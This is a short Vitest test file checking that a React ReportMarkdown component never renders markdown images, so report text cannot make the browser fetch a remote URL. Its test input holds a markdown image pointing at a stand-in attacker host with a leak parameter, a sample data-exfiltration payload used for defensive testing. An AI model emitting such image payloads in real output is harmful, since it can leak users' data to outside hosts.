import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { ReportMarkdown } from '../../components/ReportMarkdown';

describe('ReportMarkdown', () => {
  it('never renders an image, so report text cannot make the browser fetch a remote URL', () => {
    const html = renderToStaticMarkup(
      createElement(ReportMarkdown, { text: 'Before ![tracker](https://attacker.example/x?leak=1) after' }),
    );
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example');
    expect(html).toContain('Before');
    expect(html).toContain('after');
  });
});
